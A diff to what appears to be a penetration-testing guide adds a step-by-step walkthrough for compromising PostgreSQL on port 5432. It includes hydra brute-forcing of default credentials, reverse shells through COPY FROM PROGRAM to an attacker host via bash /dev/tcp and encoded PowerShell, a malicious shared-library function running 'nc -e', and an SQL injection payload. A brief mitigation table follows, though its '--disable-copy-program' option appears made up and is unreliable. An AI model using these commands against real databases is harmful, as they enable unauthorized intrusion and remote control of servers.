@@ -1014,10 +1014,137 @@ Now, try accessing the directory as `vulnix_user`:
 
 
 <details>
-<summary>12. mysql  port 3306</summary>
+<summary>12. PostgreSQL 5432</summary>
  <br>
+ PostgreSQL, also known as Postgres, is an advanced open-source relational database used across major platforms (Linux, Windows, Mac). It ships by default with macOS and is often used in enterprise backends.
 
+PostgreSQL includes powerful functionality such as user-defined functions, server-side programming, and even the ability to execute system commands — which, when misconfigured, becomes a privilege escalation or RCE vector.
 
+🎯 Attack Goals
+Gain remote shell access
+
+Escalate privileges (via SYSTEM/root or postgres user)
+
+Lateral movement within internal networks
+
+🧪 Step-by-Step Exploitation
+🔐 Step 1: Brute-force PostgreSQL Credentials (if creds not known)
+bash
+
+    hydra -L /usr/share/wordlists/metasploit/postgres_default_user.txt \ -P /usr/share/wordlists/metasploit/postgres_default_pass.txt \ <target-ip> postgres
+👉 This attempts default user:pass combinations like postgres:postgres.
+
+📥 Step 2: Log in with psql or Metasploit module
+bash
+
+    psql -h <target-ip> -U postgres -W
+or via Metasploit:
+
+bash
+
+    use auxiliary/scanner/postgres/postgres_login
+☠️ Step 3: Confirm Privileges (Key Requirement!)
+This RCE works only if:
+
+The user is superuser or
+
+The user has pg_execute_server_program role
+
+Check roles:
+
+sql
+
+    \du
+Look for:
+
+pgsql
+
+    postgres | Superuser, Create role, Create DB, Replication, Bypass RLS
+or:
+
+sql
+
+    SELECT usesuper, usename FROM pg_user;
+💥 Step 4: Achieve Code Execution via COPY FROM PROGRAM
+This PostgreSQL feature allows importing data from an OS command.
+
+Example: Windows Reverse Shell (PowerShell)
+sql
+
+    CREATE TABLE cmd_out(data text);
+    COPY cmd_out FROM PROGRAM 'powershell -EncodedCommand <Base64Payload>';
+👉 Base64Payload is your reverse shell (msfvenom -p windows/x64/powershell_reverse_tcp)
+
+Linux Example:
+sql
+
+    COPY cmd_out FROM PROGRAM '/bin/bash -c "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1"';
+🛠 Tools to generate shell payloads:
+
+bash
+
+    msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw
+🛠️ Alternative Methods of Exploitation
+1. User-Defined Functions (UDF) via Shared Object Libraries
+Upload a malicious .so (Linux) or .dll (Windows) and load it using:
+
+sql
+
+    CREATE FUNCTION sys_exec(text) RETURNS int
+    AS '/tmp/malicious.so', 'exec'
+    LANGUAGE C STRICT;
+    SELECT sys_exec('nc -e /bin/bash <attacker-ip> <port>');
+Requires superuser privileges and shared_preload_libraries.
+
+2. Writable Filesystem Abuse
+Check writable paths:
+
+sql
+
+    COPY cmd_out TO '/tmp/test.txt';
+If successful, you can:
+
+Write malicious scripts
+Drop cron jobs (Linux)
+Schedule tasks (Windows)
+
+3. SQL Injection in Web Applications
+If PostgreSQL is the backend and the app is vulnerable to SQLi:
+
+sql
+
+    '; COPY cmd_out FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"' --
+Useful if you don’t have creds but have SQLi in a web app.
+
+🧼 Cleanup (Optional)
+sql
+
+    DROP TABLE cmd_out;
+🔒 Detection & Mitigation
+Defense Area	Recommendation
+🔐 Privilege Restriction	Avoid granting pg_execute_server_program or superuser to non-admin users
+🔍 Logging	Enable query logging: log_statement = 'all'
+🛡️ Disable COPY PROGRAM	Use PostgreSQL --disable-copy-program or AppArmor/SELinux
+📦 Application Security	Sanitize SQL inputs to prevent injection
+🔑 Credential Hygiene	Avoid default credentials and enforce strong auth
+🔁 Regular Audits	Monitor user roles (\du) and extensions (\dx)
+
+📌 Summary
+Stage	Command
+Brute Force	hydra -L ... -P ... <ip> postgres
+Check Privs	\du or SELECT usesuper FROM pg_user;
+Reverse Shell	COPY ... FROM PROGRAM 'bash ...'
+UDF Execution	CREATE FUNCTION ... with .so/.dll
+SQLi RCE	Inject COPY command via vulnerable web app
+
+📎 Reference
+Greenwolf Security – PostgreSQL RCE via COPY
+
+Metasploit Modules
+
+exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+
+exploit/windows/postgres/postgres_payload
 </details>
 
 
